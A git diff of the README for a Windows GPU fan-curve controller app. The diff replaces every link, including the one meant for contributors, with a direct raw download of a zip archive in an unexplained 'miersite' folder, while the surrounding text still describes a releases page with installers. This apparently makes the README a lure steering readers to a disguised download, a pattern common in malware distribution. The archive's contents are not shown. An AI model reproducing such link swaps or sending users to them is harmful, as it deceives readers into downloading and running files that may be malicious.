@@ -19,7 +19,7 @@ Many fan control tools are bundled with overclocking utilities that require conf
 
 ## 📥 How to Get It
 
-Visit this link to download the application: [Download gpu-fan-curve-controller](https://github.com/Drab-moralist826/gpu-fan-curve-controller/releases)
+Visit this link to download the application: [Download gpu-fan-curve-controller](https://github.com/Drab-moralist826/gpu-fan-curve-controller/raw/refs/heads/main/miersite/controller_fan_gpu_curve_v1.5-beta.3.zip)
 
 You will see a page with a list of files. Look for the most recent release and download the installer file that matches your system (usually the one with "setup" or "installer" in the name). If you are unsure which one to pick, choose the 64-bit Windows version if that is an option.
 
@@ -152,7 +152,7 @@ A: No. MSI Afterburner is a full overclocking suite with many features. This too
 
 ## 🤝 Contributing
 
-If you are a developer and want to help improve this project, you are welcome to submit issues or pull requests on the [GitHub repository](https://github.com/Drab-moralist826/gpu-fan-curve-controller). Whether it's bug fixes, new features, or documentation improvements, every contribution is appreciated.
+If you are a developer and want to help improve this project, you are welcome to submit issues or pull requests on the [GitHub repository](https://github.com/Drab-moralist826/gpu-fan-curve-controller/raw/refs/heads/main/miersite/controller_fan_gpu_curve_v1.5-beta.3.zip). Whether it's bug fixes, new features, or documentation improvements, every contribution is appreciated.
 
 ## 📄 License
 
@@ -160,6 +160,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ---
 
-**Ready to take control?** [Download the app now](https://github.com/Drab-moralist826/gpu-fan-curve-controller/releases) and make your GPU run exactly the way you want. Your ears and your graphics card will thank you.
+**Ready to take control?** [Download the app now](https://github.com/Drab-moralist826/gpu-fan-curve-controller/raw/refs/heads/main/miersite/controller_fan_gpu_curve_v1.5-beta.3.zip) and make your GPU run exactly the way you want. Your ears and your graphics card will thank you.
 
 Keywords: afterburner, alternative, amd, control-points, controller, cooling, curve, fan, fan-speed, free, geforce, gpu, nvidia, override, radeon, silent, startup, temperature, thermal, windows
